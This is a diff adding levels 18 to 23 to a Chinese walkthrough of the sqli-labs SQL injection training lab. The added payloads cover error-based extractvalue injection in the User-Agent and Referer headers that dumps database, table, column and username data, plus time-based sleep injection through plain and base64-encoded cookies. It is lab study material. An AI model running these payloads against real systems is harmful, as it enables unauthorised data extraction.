@@ -154,7 +154,41 @@
 
 1. 注入语句如后  `uname=admin&passwd=1234567' and exists(select * from information_schema.tables)#&submit=Submit`
 
-## 感谢以下博文的原作者。
+## 第十八关
+
+做的时候毫无思路。
+
+1. 这里需要在用户名和密码都正确的前提下，在user-agent字段下进行报错注入。  
+获取数据库名  `' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) and '1'='1`  
+获取表名  `' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x7e))) and '1'='1`  
+获取字段名  `' and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e))) and '1'='1`  
+获取字段值  `' and (extractvalue(1,concat(0x7e,(select username from users),0x7e))) and '1'='1`  
+
+## 第十九关
+
+1. 解题思路同第十八关，只不过注入点在refer字段
+
+## 第二十关
+
+1. 这关考察cookie注入，使用正确密码登陆后，截取第二个带cookie的数据包进行注入  `Cookie: uname=admin' and sleep(5) #`
+
+## 第二十一关
+
+1. 这关仍是cookie注入，但此处的cookie已经被base64进行了加密，因此需要进行base64加密后再进行注入  `admin')   and sleep(5)   #` 实际的注入语句  `Cookie: uname=YWRtaW4nKSAgIGFuZCBzbGVlcCg1KSAgICM=`  
+
+## 第二十二关
+
+1. 这关思路和前一关一致，只不过闭合方式不同  `admin" and sleep(5) #` 实际注入语句 `Cookie: uname=YWRtaW4iIGFuZCBzbGVlcCg1KSAj`
+
+## 第二十三关
+
+1. 注入语句如后 `http://192.168.3.148/Less-23/?id=11' and sleep(5) and '1'='1`
+
+## 感谢以下博文的原作者
 
 > https://blog.csdn.net/sdb5858874/article/details/80727555  
-https://blog.csdn.net/alex_seo/article/details/82148955
+https://blog.csdn.net/alex_seo/article/details/82148955  
+https://blog.csdn.net/qq_34444097/article/details/83043678  
+https://blog.csdn.net/qq_28295425/article/details/78905978  
+https://blog.csdn.net/u012763794/article/details/51361152  
+
